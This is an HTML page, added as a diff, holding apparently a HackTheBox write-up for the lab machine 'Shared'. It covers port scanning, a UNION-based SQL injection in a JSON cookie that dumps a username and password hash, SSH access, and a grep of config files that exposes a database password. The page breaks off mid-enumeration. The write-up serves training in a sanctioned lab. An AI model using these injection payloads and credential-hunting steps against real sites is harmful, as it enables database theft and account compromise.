@@ -1,0 +1,1006 @@
+<!DOCTYPE html>
+<html
+  lang="en"
+  dir="ltr"
+  
+><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+<title>HTB - Shared | Lux-Sit</title>
+
+<meta name="generator" content="Hugo Eureka 0.9.3" />
+<link rel="stylesheet" href="https://alpharivs.github.io/css/eureka.min.9cec6350e37e534b0338fa9a085bf06855de3b0f2dcf857e792e5e97b07ea905d4d5513db554cbc26a9c3da622bae92d.css">
+<script defer src="https://alpharivs.github.io/js/eureka.min.fa9a6bf6d7a50bb635b4cca7d2ba5cf3dfb095ae3798773f1328f7950028b48c17d06276594e1b5f244a25a6c969a705.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload"
+  href="https://fonts.googleapis.com/css2?family=Lora:wght@400;600;700&amp;family=Noto&#43;Serif&#43;SC:wght@400;600;700&amp;display=swap"
+  as="style" onload="this.onload=null;this.rel='stylesheet'">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/styles/base16/solarized-light.min.css"
+   media="print"
+  onload="this.media='all';this.onload=null" crossorigin>
+<script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/highlight.min.js"
+   crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/dart.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/bash.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/cpp.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/python.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/c.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/vbscript.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/powershell.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/http.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/x86asm.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/go.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/javascript.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/ruby.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/php.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/shell.min.js"
+     crossorigin></script>
+<link rel="stylesheet" href="https://alpharivs.github.io/css/highlightjs.min.2958991528e43eb6fc9b8c4f2b8e052f79c4010718e1d1e888a777620e9ee63021c2c57ec7417a3108019bb8c41943e6.css" media="print" onload="this.media='all';this.onload=null">
+
+
+<script defer type="text/javascript" src="https://alpharivs.github.io/js/fontawesome.min.d1a1d765b1b3c0c86dd45b8e5934d8febe529d6e1a221a6ce32dcc44678b12e72f47c6b3619acaf779d3d6327a38f29d.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css"
+   integrity="sha384-MlJdn/WNKDGXveldHDdyRP1R4CTHr3FeuDNfhsLPYrq2t0UBkUdK2jyTnXPEK1NQ"  media="print"
+  onload="this.media='all';this.onload=null" crossorigin>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js" 
+  integrity="sha384-VQ8d8WVFw0yHhCk5E8I86oOhv48xLpnDZx5T9GogA/Y84DcCKWXDmSDfn13bzFZY"  crossorigin></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js"
+   integrity="sha384-&#43;XBljXPPiv&#43;OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR"  crossorigin></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    renderMathInElement(document.body, {
+      delimiters: [
+        { left: "$$", right: "$$", display: true },
+        { left: "$", right: "$", display: false },
+        { left: "\\(", right: "\\)", display: false },
+        { left: "\\[", right: "\\]", display: true }
+      ],
+    });
+  });
+</script>
+
+
+<script defer src="https://cdn.jsdelivr.net/npm/mermaid@8.14.0/dist/mermaid.min.js" 
+  integrity="sha384-atOyb0FxAgN9LyAc6PEf9BjgwLISyansgdH8/VXQH8p2o5vfrRgmGIJ2Sg22L0A0"  crossorigin></script>
+
+
+<link rel="icon" type="image/png" sizes="32x32" href="https://alpharivs.github.io/images/icon_hu4bae09c78eba04c5e7d71d1040233379_73006_32x32_fill_q75_box_center.jpg">
+<link rel="apple-touch-icon" sizes="180x180" href="https://alpharivs.github.io/images/icon_hu4bae09c78eba04c5e7d71d1040233379_73006_180x180_fill_q75_box_center.jpg">
+
+<meta name="description"
+  content="Write-up for the machine &#34;Shared&#34;">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+      "@type": "ListItem",
+      "position": 1 ,
+      "name":"Posts",
+      "item":"https://alpharivs.github.io/htb_writeups/"},{
+      "@type": "ListItem",
+      "position": 2 ,
+      "name":"HTB - Shared",
+      "item":"https://alpharivs.github.io/htb_writeups/htb_shared/"}]
+}
+</script>
+
+
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://alpharivs.github.io/htb_writeups/htb_shared/"
+    },
+    "headline": "HTB - Shared | Lux-Sit",
+    "image": "https://alpharivs.github.io/images/htb_writeups/Shared.png",
+    "datePublished": "2022-11-08T00:00:00+00:00",
+    "dateModified": "2022-11-08T00:00:00+00:00",
+    "wordCount":  2737 ,
+    "author": {
+        "@type": "Person",
+        "name": "Alpharivs"
+    },
+    "publisher": {
+        "@type": "Person",
+        "name": "WANG Chucheng",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://alpharivs.github.io/images/icon.jpg"
+        }
+        },
+    "description": "Write-up for the machine \u0022Shared\u0022"
+}
+</script><meta property="og:title" content="HTB - Shared | Lux-Sit" />
+<meta property="og:type" content="article" />
+
+
+<meta property="og:image" content="https://alpharivs.github.io/images/icon.jpg">
+
+
+<meta property="og:url" content="https://alpharivs.github.io/htb_writeups/htb_shared/" />
+
+
+
+<meta property="og:description" content="Write-up for the machine &#34;Shared&#34;" />
+
+
+
+<meta property="og:locale" content="en" />
+
+
+
+
+<meta property="og:site_name" content="Lux-Sit" />
+
+
+
+
+
+
+<meta property="article:published_time" content="2022-11-08T00:00:00&#43;00:00" />
+
+
+<meta property="article:modified_time" content="2022-11-08T00:00:00&#43;00:00" />
+
+
+
+<meta property="article:section" content="htb_writeups" />
+
+
+<meta property="article:tag" content="HTB" />
+
+<meta property="article:tag" content="redis" />
+
+<meta property="article:tag" content="SQLI" />
+
+<meta property="article:tag" content="ctf" />
+
+<meta property="article:tag" content="write-up" />
+
+<meta property="article:tag" content="ipython" />
+
+
+
+
+
+
+  <body class="flex min-h-screen flex-col">
+    <header
+      class="min-h-16 pl-scrollbar bg-secondary-bg fixed z-50 flex w-full items-center shadow-sm"
+    >
+      <div class="mx-auto w-full max-w-screen-xl"><script>
+    let storageColorScheme = localStorage.getItem("lightDarkMode")
+    if (((storageColorScheme == 'Auto' || storageColorScheme == null) && window.matchMedia("(prefers-color-scheme: dark)").matches) || storageColorScheme == "Dark") {
+        document.getElementsByTagName('html')[0].classList.add('dark')
+    }
+</script>
+<nav class="flex items-center justify-between flex-wrap px-4 py-4 md:py-0">
+    <a href="/" class="me-6 text-primary-text text-xl font-bold">Lux-Sit</a>
+    <button id="navbar-btn" class="md:hidden flex items-center px-3 py-2" aria-label="Open Navbar">
+        <i class="fas fa-bars"></i>
+    </button>
+
+    <div id="target"
+        class="hidden block md:flex md:grow md:justify-between md:items-center w-full md:w-auto text-primary-text z-20">
+        <div class="md:flex md:h-16 text-sm md:grow pb-4 md:pb-0 border-b md:border-b-0">
+            <a href="/malware/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">Malware Analysis</a>
+            <a href="/writeups/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">CTF Write-ups</a>
+            <a href="/htb_writeups/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  selected-menu-item  me-4">HacktheBox Write-ups</a>
+        </div>
+
+        <div class="flex">
+            <div class="relative pt-4 md:pt-0">
+                <div class="cursor-pointer hover:text-eureka" id="lightDarkMode">
+                    <i class="fas fa-adjust"></i>
+                </div>
+                <div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-30" id="is-open">
+                </div>
+                <div class="absolute flex flex-col start-0 md:start-auto end-auto md:end-0 hidden bg-secondary-bg w-48 rounded py-2 border border-tertiary-bg cursor-pointer z-40"
+                    id='lightDarkOptions'>
+                    <span class="px-4 py-1 hover:text-eureka" name="Light">Light</span>
+                    <span class="px-4 py-1 hover:text-eureka" name="Dark">Dark</span>
+                    <span class="px-4 py-1 hover:text-eureka" name="Auto">Auto</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-0" id="is-open-mobile">
+    </div>
+
+</nav>
+<script>
+    
+    let element = document.getElementById('lightDarkMode')
+    if (storageColorScheme == null || storageColorScheme == 'Auto') {
+        document.addEventListener('DOMContentLoaded', () => {
+            window.matchMedia("(prefers-color-scheme: dark)").addEventListener('change', switchDarkMode)
+        })
+    } else if (storageColorScheme == "Light") {
+        element.firstElementChild.classList.remove('fa-adjust')
+        element.firstElementChild.setAttribute("data-icon", 'sun')
+        element.firstElementChild.classList.add('fa-sun')
+    } else if (storageColorScheme == "Dark") {
+        element.firstElementChild.classList.remove('fa-adjust')
+        element.firstElementChild.setAttribute("data-icon", 'moon')
+        element.firstElementChild.classList.add('fa-moon')
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        getcolorscheme();
+        switchBurger();
+    });
+</script>
+</div>
+    </header>
+    <main class="grow pt-16">
+        <div class="pl-scrollbar">
+          <div class="mx-auto w-full max-w-screen-xl lg:px-4 xl:px-8">
+  
+  
+  <div class="grid grid-cols-2 gap-4 lg:grid-cols-8 lg:pt-12">
+    <div
+      class=" bg-secondary-bg col-span-2 rounded px-6 py-8 lg:col-span-6"
+    >
+      <article class="prose">
+  <h1 class="mb-4">HTB - Shared</h1>
+
+  <div
+  class="text-tertiary-text not-prose mt-2 flex flex-row flex-wrap items-center"
+>
+  <div class="me-6 my-2">
+    <i class="fas fa-calendar me-1"></i>
+    <span
+      >2022-11-08</span
+    >
+  </div>
+  <div class="me-6 my-2">
+    <i class="fas fa-clock me-1"></i>
+    <span>13 min read</span>
+  </div>
+
+  
+    <div class="me-6 my-2">
+      <i class="fas fa-folder me-1"></i>
+      
+        <a href="https://alpharivs.github.io/categories/writeups/" class="hover:text-eureka"
+          >writeups</a
+        >
+      
+    </div>
+  
+
+  
+</div>
+
+
+  
+  
+    <img src="https://alpharivs.github.io/images/htb_writeups/Shared.png" class="w-full" alt="Featured Image">
+  
+
+  <h2 id="enumeration">Enumeration</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+<pre><code class="language-bash">❯ ping -c3 10.10.11.172
+PING 10.10.11.172 (10.10.11.172) 56(84) bytes of data.
+64 bytes from 10.10.11.172: icmp_seq=1 ttl=63 time=39.8 ms
+64 bytes from 10.10.11.172: icmp_seq=2 ttl=63 time=48.3 ms
+64 bytes from 10.10.11.172: icmp_seq=3 ttl=63 time=36.0 ms
+
+--- 10.10.11.172 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2003ms
+rtt min/avg/max/mdev = 36.012/41.390/48.337/5.152 ms
+</code></pre>
+<p>A TTL value of around 64 is a solid indicator that this is a Linux system.</p>
+<h3 id="port-scanning">Port Scanning</h3>
+<p>We begin by doing a full range TCP and UDP port scan, it&rsquo;s not the quickest method for doing things quickly but covering the full range in both protocols can sometimes save us some headaches.</p>
+<pre><code class="language-bash">❯ sudo masscan  10.10.11.172 -p1-65535,U:1-65535 --rate=500 -e tun0 | tee recon/ports.out
+tee: recon/ports.out: No such file or directory
+Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-11-17 18:47:11 GMT
+Initiating SYN Stealth Scan
+Scanning 1 hosts [131070 ports/host]
+
+Discovered open port 443/tcp on 10.10.11.172                                   
+Discovered open port 80/tcp on 10.10.11.172                                    
+Discovered open port 22/tcp on 10.10.11.172  
+</code></pre>
+<p>We have 3 ports open so let&rsquo;s pass those ports to Nmap and perform a detailed scan.</p>
+<pre><code class="language-ruby"># Nmap 7.93 scan initiated Mon Nov 14 12:02:29 2022 as: nmap -p443,80,22 -sC -sV -Pn -oN recon/nmap.out 10.10.11.172
+Nmap scan report for 10.10.11.172
+Host is up (0.15s latency).
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 91e835f4695fc2e20e2746e2a6b6d865 (RSA)
+|   256 cffcc45d84fb580bbe2dad35409dc351 (ECDSA)
+|_  256 a3386d750964ed70cf17499adc126d11 (ED25519)
+80/tcp  open  http     nginx 1.18.0
+|_http-server-header: nginx/1.18.0
+|_http-title: Did not follow redirect to http://shared.htb
+443/tcp open  ssl/http nginx 1.18.0
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|   h2
+|_  http/1.1
+|_http-server-header: nginx/1.18.0
+| tls-nextprotoneg: 
+|   h2
+|_  http/1.1
+|_http-title: Did not follow redirect to https://shared.htb
+| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US
+| Not valid before: 2022-03-20T13:37:14
+|_Not valid after:  2042-03-15T13:37:14
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<p>We can see that the nmap reports that the distro is Debian and it&rsquo;s an Nginx server</p>
+<p>Also we are being redirected to <a href="http://shared.htb">http://shared.htb</a> to let&rsquo;s add that to our hosts file.</p>
+<pre><code class="language-bash">❯ cat /etc/hosts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: /etc/hosts
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ # Static table lookup for hostnames.
+   2   │ 127.0.0.1   localhost nyx nyx.localhost
+   3   │ # Custom Hosts
+   4   │ 10.10.11.172    shared.htb
+   5   │ # See hosts(5) for details.
+───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</code></pre>
+<h2 id="website-tcp-80443">Website TCP 80,443</h2>
+<h3 id="recon">Recon</h3>
+<p>Let&rsquo;s start by doing a quick enumeration of the tech stack.</p>
+<pre><code class="language-shell">❯ whatweb https://shared.htb/
+https://shared.htb/ [302 Found] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.172], RedirectLocation[https://shared.htb/index.php], nginx[1.18.0]
+https://shared.htb/index.php [200 OK] Cookies[PHPSESSID,PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], HttpOnly[PHPSESSID,PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c], IP[10.10.11.172], JQuery, Open-Graph-Protocol[website], PHP, PoweredBy[PrestaShop], PrestaShop[EN], Script[application/ld+json,text/javascript], Title[Shared Shop], X-UA-Compatible[ie=edge], nginx[1.18.0]
+</code></pre>
+<p>It&rsquo;s a php site that is running PrestaShop which is an opensource e-commerce platform.</p>
+<h3 id="vulnerability-scanning">Vulnerability Scanning</h3>
+<pre><code class="language-bash">❯ nuclei -u https://shared.htb/ -ni
+
+                     __     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/   2.7.9
+
+		projectdiscovery.io
+[2022-11-17 20:06:56] [ssl-issuer] [ssl] [info] shared.htb [HTB]
+[2022-11-17 20:06:59] [tech-detect:php] [http] [info] https://shared.htb/index.php
+[2022-11-17 20:06:59] [tech-detect:nginx] [http] [info] https://shared.htb/index.php
+[2022-11-17 20:06:59] [self-signed-ssl] [ssl] [low] shared.htb
+[2022-11-17 20:07:00] [tech-detect:nginx] [http] [info] https://shared.htb/
+[2022-11-17 20:07:19] [robots-txt-endpoint] [http] [info] https://shared.htb/robots.txt
+[2022-11-17 20:07:31] [http-missing-security-headers:cross-origin-resource-policy] [http] [info] https://shared.htb/index.php
+[2022-11-17 20:07:31] [http-missing-security-headers:access-control-allow-credentials] [http] [info] https://shared.htb/index.php
+[2022-11-17 20:07:31] [http-missing-security-headers:access-control-expose-headers] [http] [info] https://shared.htb/index.php
+[2022-11-17 20:07:31] [http-missing-security-headers:content-security-policy] [http] [info] https://shared.htb/index.php
+[2022-11-17 20:07:31] [http-missing-security-headers:cross-origin-opener-policy] [http] [info] https://shared.htb/index.php
+[2022-11-17 20:07:31] [http-missing-security-headers:clear-site-data] [http] [info] https://shared.htb/index.php
+[2022-11-17 20:07:31] [http-missing-security-headers:access-control-allow-methods] [http] [info] https://shared.htb/index.php
+[2022-11-17 20:07:31] [http-missing-security-headers:access-control-allow-headers] [http] [info] https://shared.htb/index.php
+[2022-11-17 20:07:31] [http-missing-security-headers:strict-transport-security] [http] [info] https://shared.htb/index.php
+[2022-11-17 20:07:31] [http-missing-security-headers:x-frame-options] [http] [info] https://shared.htb/index.php
+[2022-11-17 20:07:31] [http-missing-security-headers:referrer-policy] [http] [info] https://shared.htb/index.php
+[2022-11-17 20:07:31] [http-missing-security-headers:access-control-allow-origin] [http] [info] https://shared.htb/index.php
+[2022-11-17 20:07:31] [http-missing-security-headers:permissions-policy] [http] [info] https://shared.htb/index.php
+[2022-11-17 20:07:31] [http-missing-security-headers:x-content-type-options] [http] [info] https://shared.htb/index.php
+[2022-11-17 20:07:31] [http-missing-security-headers:access-control-max-age] [http] [info] https://shared.htb/index.php
+[2022-11-17 20:07:31] [http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] https://shared.htb/index.php
+[2022-11-17 20:07:31] [http-missing-security-headers:cross-origin-embedder-policy] [http] [info] https://shared.htb/index.php
+[2022-11-17 20:07:37] [deprecated-tls] [ssl] [info] shared.htb [tls10]
+[2022-11-17 20:07:38] [deprecated-tls] [ssl] [info] shared.htb [tls11]
+[2022-11-17 20:08:51] [composer-config:composer.lock] [http] [info] https://shared.htb/composer.lock
+[2022-11-17 20:08:57] [robots-txt] [http] [info] https://shared.htb/robots.txt
+[2022-11-17 20:09:00] [waf-detect:nginxgeneric] [http] [info] https://shared.htb/
+[2022-11-17 20:09:20] [mismatched-ssl] [ssl] [low] shared.htb
+[2022-11-17 20:10:09] [openssh-detect] [network] [info] shared.htb:22 [SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1]
+[2022-11-17 20:10:30] [tls-version] [ssl] [info] shared.htb [tls13]
+</code></pre>
+<p>Although the vulnerability scanner found some issues, none of them are relevant for this ctf environment.</p>
+<h3 id="directory-brute-forcing">Directory Brute-Forcing</h3>
+<pre><code class="language-ruby">❯ feroxbuster -u https://shared.htb/ -w $(dlist) -x php -k -C 403 -n
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben &quot;epi&quot; Risher 🤓                 ver: 2.7.1
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ https://shared.htb/
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
+ 💢  Status Code Filters   │ [403]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.7.1
+ 💲  Extensions            │ [php]
+ 🏁  HTTP methods          │ [GET]
+ 🔓  Insecure              │ true
+ 🚫  Do Not Recurse        │ true
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+301      GET        7l       11w      169c https://shared.htb/modules =&gt; https://shared.htb/modules/
+301      GET        7l       11w      169c https://shared.htb/cache =&gt; https://shared.htb/cache/
+301      GET        7l       11w      169c https://shared.htb/js =&gt; https://shared.htb/js/
+301      GET        7l       11w      169c https://shared.htb/themes =&gt; https://shared.htb/themes/
+301      GET        7l       11w      169c https://shared.htb/bin =&gt; https://shared.htb/bin/
+301      GET        7l       11w      169c https://shared.htb/download =&gt; https://shared.htb/download/
+301      GET        7l       11w      169c https://shared.htb/img =&gt; https://shared.htb/img/
+301      GET        7l       11w      169c https://shared.htb/config =&gt; https://shared.htb/config/
+301      GET        7l       11w      169c https://shared.htb/docs =&gt; https://shared.htb/docs/
+301      GET        7l       11w      169c https://shared.htb/upload =&gt; https://shared.htb/upload/
+301      GET        7l       11w      169c https://shared.htb/pdf =&gt; https://shared.htb/pdf/
+301      GET        7l       11w      169c https://shared.htb/tools =&gt; https://shared.htb/tools/
+301      GET        7l       11w      169c https://shared.htb/classes =&gt; https://shared.htb/classes/
+301      GET        7l       11w      169c https://shared.htb/app =&gt; https://shared.htb/app/
+301      GET        7l       11w      169c https://shared.htb/var =&gt; https://shared.htb/var/
+301      GET        7l       11w      169c https://shared.htb/mails =&gt; https://shared.htb/mails/
+301      GET        7l       11w      169c https://shared.htb/translations =&gt; https://shared.htb/translations/
+301      GET        7l       11w      169c https://shared.htb/src =&gt; https://shared.htb/src/
+301      GET        7l       11w      169c https://shared.htb/controllers =&gt; https://shared.htb/controllers/
+301      GET        7l       11w      169c https://shared.htb/vendor =&gt; https://shared.htb/vendor/
+301      GET        7l       11w      169c https://shared.htb/webservice =&gt; https://shared.htb/webservice/
+200      GET        7l        8w       88c https://shared.htb/Makefile
+301      GET        7l       11w      169c https://shared.htb/localization =&gt; https://shared.htb/localization/
+200      GET     3302l    29505w   186018c https://shared.htb/LICENSES
+301      GET        7l       11w      169c https://shared.htb/override =&gt; https://shared.htb/override/
+[####################] - 1h     86016/86016   0s      found:25      errors:29     
+[####################] - 1h     86017/86016   20/s    https://shared.htb/ 
+</code></pre>
+<p>Nothing interesting found with directory brute-forcing so let&rsquo;s now manually explore the website.</p>
+<h3 id="exploring-the-website">Exploring the Website</h3>
+<p>Upon loading we are greeted with the following website.
+<img src="images/main.png" alt="main"></p>
+<p>Immediately we have what seems to be a hint so let&rsquo;s try to buy something and test this new checkout process.</p>
+<pre><code class="language-text">New checkout process
+
+We are happy to announce that we just launched a new checkout process.
+That will allow you to pay easier your orders with most used online payment methods.
+
+Be sure to take a look on it!
+</code></pre>
+<p>Let&rsquo;s just purchase a cool T-shirt.
+<img src="images/buying.png" alt="buying">
+We just add it to the cart and then click proceed to checkout.
+<img src="images/checkout.png" alt="checkout"></p>
+<p>When clicking proceed to checkout we are redirected to a new subdomain:</p>
+<pre><code class="language-text">https://checkout.shared.htb/
+</code></pre>
+<p>Let&rsquo;s add it to the hosts file.</p>
+<pre><code class="language-bash">❯ cat /etc/hosts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: /etc/hosts
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ # Static table lookup for hostnames.
+   2   │ 127.0.0.1   localhost nyx nyx.localhost
+   3   │ # Custom Hosts
+   4   │ 10.10.11.172    shared.htb checkout.shared.htb
+   5   │ # See hosts(5) for details.
+───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</code></pre>
+<h3 id="checkout-subdomain">checkout Subdomain</h3>
+<p>The main page of the checkout subdomain, interestingly the name of the product is translated to a product id, that hint toward some sort of relational database being used so we could just fire up Burpsuite and check for potentially SQLI vulnerable parameters.
+<img src="images/checkout_site.png" alt="checkout_site"></p>
+<h2 id="sqli-in-cookie-header">SQLI in Cookie Header</h2>
+<p>After checking the request to checkout.shared.htb we can see that we have a custom cookie that contains the product id within the Cookie header.
+<img src="images/custom_cookie.png" alt="custom_cookie"></p>
+<h3 id="test">Test</h3>
+<p>Let&rsquo;s check if it&rsquo;s vulnerable to SQLI.</p>
+<p>&ldquo;&rsquo;&rdquo; triggers an error</p>
+<pre><code class="language-bash">custom_cart=%7B%22YCS98E4A'%22%3A%221%22%7D
+
+Not Found
+</code></pre>
+<p>adding a comment get&rsquo;s rid of the error so we can confirm that we are dealing with an <em><strong>error based in-band SQLI injection</strong></em>.</p>
+<pre><code class="language-bash">custom_cart=%7B%22YCS98E4A' -- -%22%3A%221%22%7D
+
+YCS98E4A
+</code></pre>
+<h3 id="data-exfiltration">Data Exfiltration</h3>
+<p>Now that we know that we are dealing with a SQLI let&rsquo;s try extracting the database, we begin by checking the number of columns.</p>
+<pre><code class="language-bash">custom_cart=%7B%22YCS98E4A' UNION SELECT 1,2,3 -- -%22%3A%221%22%7D
+
+YCS98E4A
+</code></pre>
+<p>Now that we know that it works at 3 let&rsquo;s check which column reflects data back to us.</p>
+<pre><code class="language-bash">custom_cart=%7B%22YCS98E4' UNION SELECT 1,2,3 -- -%22%3A%221%22%7D
+
+2
+</code></pre>
+<p>Testing by enumerating the version.</p>
+<pre><code class="language-bash">custom_cart=%7B%22' UNION SELECT 1,@@version,3 -- -%22%3A%221%22%7D
+
+10.5.15-MariaDB-0+deb11u1
+</code></pre>
+<p>Now we can enumerate the the databases querying information_schema.schemata.</p>
+<pre><code class="language-bash">custom_cart=%7B%22' UNION SELECT 1,(select group_concat(schema_name) from information_schema.schemata),3 -- -%22%3A%221%22%7D
+
+information_schema
+checkout
+</code></pre>
+<p>We have 2 databases, we are only interested in the &ldquo;checkout&rdquo; database so let&rsquo;s enumerate it&rsquo;s tables and columns.</p>
+<pre><code class="language-bash">custom_cart=%7B%22' UNION SELECT 1,(select group_concat(table_name,':',column_name) from information_schema.columns where table_schema like 'checkout'),3 -- -%22%3A%221%22%7D
+
+user:id
+user:username
+user:password
+product:id
+product:code
+product:price
+</code></pre>
+<p>The password and username columns of the user table immediately jumps out so let&rsquo;s extract it&rsquo;s data</p>
+<pre><code class="language-bash">custom_cart=%7B%22' UNION SELECT 1,(select group_concat(username,':',password) from user),3 -- -%22%3A%221%22%7D
+
+james_mason:fc895d4eddc2fc12f995e18c865cf273
+</code></pre>
+<p>We have a user name and what seems to be a MD5 hash that we will attempt to crack.
+<img src="images/cracked.png" alt="cracked"></p>
+<p>It worked!.</p>
+<h2 id="user-james_mason">User: james_mason</h2>
+<p>We can now ssh into the box as the user james_mason.</p>
+<pre><code class="language-bash">james_mason@shared:~$ whoami
+james_mason
+</code></pre>
+<h3 id="enumeration-1">Enumeration</h3>
+<p>First let&rsquo;s check other users of the machine.</p>
+<pre><code class="language-bash">james_mason@shared:~$ cat /etc/passwd | grep sh$
+root❌0:0:root:/root:/bin/bash
+james_mason❌1000:1000:james_mason,,,:/home/james_mason:/bin/bash
+dan_smith❌1001:1002::/home/dan_smith:/bin/bash
+</code></pre>
+<p>Interestingly when checking which groups our user has membership of we can see that james_mason is a member of a suspicious non default group.</p>
+<pre><code class="language-bash">james_mason@shared:~$ id
+uid=1000(james_mason) gid=1000(james_mason) groups=1000(james_mason),1001(developer)
+</code></pre>
+<h3 id="developer-group">Developer Group</h3>
+<p>A good point to start is searching for all the files that our suspicious group has access to.</p>
+<pre><code class="language-bash">james_mason@shared:~$ find / -group developer -ls 2&gt;/dev/null
+    46286      4 drwxrwx---   2 root     developer     4096 Nov 14 12:20 /opt/scripts_review
+</code></pre>
+<p>Interestingly we have full access to the /opt/scripts_review directory.</p>
+<p>We can also enumerate /var/www/ for credentials as there is a database present there must be some configuration files.</p>
+<pre><code class="language-bash">james_mason@shared:/var/www/shared.htb/ps/app/config$ grep -R -i password
+doctrine.yml:        password: &quot;%database_password%&quot;
+config.yml:    password:  &quot;%mailer_password%&quot;
+parameters.yml.dist:    database_password: ~
+parameters.yml.dist:    mailer_password:   ~
+parameters.php:    'database_password' =&gt; 'T*k#cbND_C*WrQ9h',
+parameters.php:    'mailer_password' =&gt; NULL,
+</code></pre>
+<pre><code class="language-bash">james_mason@shared:/var/www/shared.htb/ps/app/config$ cat parameters.php
+...(SNIP)...
+    'database_user' =&gt; 'pshop',
+    'database_password' =&gt; 'T*k#cbND_C*WrQ9h',
+</code></pre>
+<pre><code class="language-bash">james_mason@shared:/var/www/checkout.shared.htb/config$ cat db.php 
+&lt;?php
